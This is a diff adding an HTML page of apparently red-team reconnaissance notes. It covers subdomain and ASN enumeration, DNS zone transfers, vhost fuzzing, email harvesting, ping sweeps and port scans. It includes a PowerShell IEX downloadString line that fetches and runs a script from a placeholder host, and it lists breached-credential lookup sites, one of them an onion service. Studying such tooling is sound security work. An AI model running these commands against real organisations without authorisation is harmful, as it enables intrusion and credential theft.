@@ -1,0 +1,96 @@
+<hr>
+<h2 id="title-Enumerate-and-Reconnaissance-memocategories-Studytags-Notes"><a href="#title-Enumerate-and-Reconnaissance-memocategories-Studytags-Notes" class="headerlink" title="title: Enumerate and Reconnaissance memocategories: Studytags: Notes"></a>title: Enumerate and Reconnaissance memo<br>categories: Study<br>tags: Notes</h2><h4 id="Reference-Linking"><a href="#Reference-Linking" class="headerlink" title="Reference Linking:"></a>Reference Linking:</h4><p><a href="https://red.ghostwolflab.com/category/information/">ghostwolflab.com</a></p>
+<h4 id="Domain-Info"><a href="#Domain-Info" class="headerlink" title="Domain Info:"></a>Domain Info:</h4><p>ASN:</p>
+<pre><code class="bash">amass intel -org google 
+</code></pre>
+<pre><code class="bash">amass intel -asn num,num,num
+</code></pre>
+<pre><code class="bash">bbot -t tesla.com -f subdomain-enum
+</code></pre>
+<pre><code class="bash">whois -h whois.radb.net -- &#39;-i origin AS11535&#39; | grep -Eo &quot;([0-9.]+){4}/[0-9]+&quot; | uniq 
+</code></pre>
+<p>Copyright:</p>
+<pre><code class="bash">shodan search http.html:&quot;Copyright targect&quot;
+</code></pre>
+<p>Enumerate  Domain info:</p>
+<pre><code class="bash">amass intel -d domain.name -whois
+</code></pre>
+<pre><code class="bash">dnsenum target.domain
+gobuster dns -d target.domain -t 50 -w subdomains.txt
+findomain -t &quot;target.domain&quot; -a -o
+assetfinder &quot;target.domain&quot; 
+subfinder -d &quot;target.domain&quot; -o &quot;target.txt&quot;
+bbot -t ghostwolflab.com -f subdomain-enum
+</code></pre>
+<p>Zone:</p>
+<pre><code class="bash">dnsrecon -d &quot;target.domain&quot; -t axfr
+dnsrecon -a -d &quot;target.domain&quot;
+</code></pre>
+<p>Reverse :</p>
+<pre><code class="bash">dnsrecon -r &lt;DNS Range&gt; -n &lt;IP_DNS&gt; 
+dnsrecon -r 0.0.0.0/24 -n 1.1.1.1
+</code></pre>
+<p>Vhost:</p>
+<pre><code class="bash">gobuster vhost --useragent &quot;PENTEST&quot; --wordlist &quot;/path/to/wordlist.txt&quot; --url $URL
+</code></pre>
+<pre><code class="bash">wfuzz -H &quot;Host: FUZZ.something.com&quot; --hc 404,403 -H &quot;User-Agent: PENTEST&quot; -c -z file,&quot;/path/to/wordlist.txt&quot; $URL
+</code></pre>
+<p>Ico_hash:</p>
+<pre><code class="bash">cat my_targets.txt | xargs -I %% bash -c &#39;echo &quot;http://%%/favicon.ico&quot;&#39; &gt; targets.txt
+python3 favihash.py -f https://target/favicon.ico -t targets.txt -s
+</code></pre>
+<p>Spider:</p>
+<pre><code class="bash">go install github.com/jaeles-project/gospider@latest
+./gospider -s &quot;http://域名或IP地址/&quot; --js -t 20 -d 2 --sitemap --robots -w -r &gt; urls.txt
+cat urls.txt | grep -Eo &quot;(http|https)://[a-zA-Z0-9./?=_-]*&quot;*
+</code></pre>
+<h4 id="Email-and-Cred"><a href="#Email-and-Cred" class="headerlink" title="Email and Cred:"></a>Email and Cred:</h4><p>Emain address:</p>
+<pre><code class="bash">theHarvester -d target.com -b google,bing,baidu,bufferoverun,crtsh,dnsdumpster,duckduckgo,github-code,hackertarget,netcraft,rapiddns,rocketreach,sublist3r,trello,urlscan  -n -r -v -s --screenshot target/harvester -g 
+</code></pre>
+<pre><code class="url">https://hunter.io/
+</code></pre>
+<pre><code class="url">https://app.snov.io/
+</code></pre>
+<pre><code class="url">https://minelead.io/
+</code></pre>
+<p>Creds:</p>
+<pre><code class="url">https://leak-lookup.com
+</code></pre>
+<pre><code class="url">https://www.dehashed.com/
+</code></pre>
+<pre><code class="url">https://breachdirectory.tk/
+</code></pre>
+<pre><code class="url">https://haveibeenpwned.com/
+</code></pre>
+<pre><code class="url">https://dehashed.com/
+</code></pre>
+<pre><code class="url">http://pwndb2am4tzkvold.onion/
+</code></pre>
+<p><a href="https://red.ghostwolflab.com/information/osint/591/">Github Dorks</a></p>
+<p><a href="https://red.ghostwolflab.com/information/osint/534/">Google Dorks</a></p>
+<h4 id="Hostinfo"><a href="#Hostinfo" class="headerlink" title="Hostinfo:"></a>Hostinfo:</h4><p>Linux scan C:</p>
+<pre><code class="bash">for i in {1..254}; do (ping -c 1 192.168.122.${i} | grep &quot;bytes from&quot; | grep -v &quot;Unreachable&quot; &amp;); done;
+</code></pre>
+<p>Windows：</p>
+<pre><code class="cmd">for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1 | find /i &quot;ttl&quot;
+</code></pre>
+<pre><code class="cmd">FOR /F &quot;eol=- tokens=1 delims=\ &quot; %a IN (&#39;net view&#39;) DO @(echo name: %a, ip: &amp; ping %a -w 1 -n 1 | find /i &quot;ttl&quot; &amp; echo.)
+</code></pre>
+<p>Port Scan:</p>
+<pre><code class="bash">fscan -hf ipaddress -p 21,22,25,53,80,88,135,139,443,445,389,3306,3389,1521,1433,6379,5432 -np -t 300
+</code></pre>
+<pre><code class="powershell">IEX(New-Object Net.webclient).downloadString(&#39;http://192.168.X.Y/InvokePortscan.ps1&#39;)
+</code></pre>
+<pre><code class="powershell">Invoke-Portscan -Hosts 172.16.186.181 -Ports &quot;21,22,23,53,69,71,80,88,98,110,139,111,389,443,445,1080,1433,2001,2049,3001,3128,5222,5985,5986,6667,6868,7777,7878,8000,8080,8081,9090,1521,3306,3389,5801,5900,5555,5901&quot; | Select -ExpandProperty openPorts
+</code></pre>
+<pre><code class="powershell">Invoke-Portscan -Hosts &quot;172.16.219.192,172.16.219.194&quot; -TopPorts 100
+</code></pre>
+<p>UDP Port Scan:</p>
+<pre><code class="bash">Nmap
+# Nmap fast check if any of the 100 most common UDP services is running
+nmap -sU -sV --version-intensity 0 -n -F -T4 &lt;IP&gt;
+# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
+nmap -sU -sV -sC -n -F -T4 &lt;IP&gt; 
+# Nmap fast top 1000 UDP ports
+nmap -sU -sV --version-intensity 0 -n -T4 &lt;IP&gt;
+</code></pre>
